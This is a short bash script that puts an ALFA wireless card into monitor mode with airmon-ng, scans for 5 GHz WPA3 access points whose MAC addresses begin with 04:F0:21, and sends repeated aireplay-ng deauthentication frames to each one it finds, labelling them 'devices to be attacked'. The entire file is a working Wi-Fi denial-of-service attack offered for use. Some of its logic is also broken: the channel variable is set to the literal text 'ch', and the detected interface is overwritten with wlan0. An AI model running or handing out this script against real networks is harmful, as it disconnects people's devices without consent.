#!/bin/bash

find_mesh_wifi_device()
{
  
  echo "Find ALFA WIFI card with ouid=$1"

  ifnames=$(ls /sys/class/net/)

  interface=$(lshw -C network |  grep -B5 "driver=rtl8814au" | awk '$1=="logical" {print $3}')
}



find_mesh_wifi_device 00:c0:ca

if [ "$interface" != "" ];  then
      echo "Found: $interface with ALFA card"
else
      echo "ERROR! Can't find correct wifi device!"
      #exit 1
fi

interface=wlan0
airmon-ng check kill

airmon-ng start $interface

channel=0

bssid_list=()

airodump=$(airodump-ng "$interface" -b a| grep WPA3 | head -n 50)


while IFS= read -r line; do  

	words=( $line )
	mac=${words[0]}
	ch=${words[5]}
	
	[[ ${bssid_list[@]} =~ (^|[[:space:]])"$mac"($|[[:space:]]) ]] && result=1 || result=0 
	
	
	if   [ "${mac:0:8}" == "04:F0:21" ] && [ "$result" == 0 ]
		then
		
		bssid_list+=( "$mac" )
		channel=ch
		
	fi



done <<< "$airodump"

echo "List of the devices to be attacked"
echo "${bssid_list[@]}"



echo "Launching airodump-ng on another terminal to set the channel"
xterm -e airodump-ng --channel $channel $interface & 

for value in ${bssid_list[@]};
do	
    echo "Attacking device " $value " now "
    aireplay-ng -0 10 -a $value $interface 

done